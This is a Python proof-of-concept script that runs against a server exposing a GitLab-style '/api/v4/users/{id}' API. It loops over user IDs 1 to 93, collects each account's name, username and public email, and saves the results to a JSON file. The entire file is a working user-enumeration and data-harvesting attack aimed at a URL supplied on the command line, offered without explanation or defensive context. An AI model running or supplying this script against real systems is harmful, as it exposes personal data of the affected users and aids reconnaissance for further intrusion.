import requests
import json
import sys
import os
results = []
url = sys.argv[1]

def send_poc(user):
    headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-GPC': '1',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?{}'.format(user),
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
    
    }
    try:
      response = requests.get(url+'/api/v4/users/{}'.format(user), headers=headers)
      if response:
         print(response)
         info = json.loads(response.text)
         if info:
            results.append(info)
            print(info['name'],info['username'],info['public_email'])

    except Exception as oops:
      print(oops)
      pass

for i in range(1,94):
    try:
       send_poc(i)
    except Exception as oof:
        print(oof)
        pass

if results:
   with open('data.json', 'w', encoding='utf-8') as f:
       json.dump(results, f, ensure_ascii=False, indent=4)
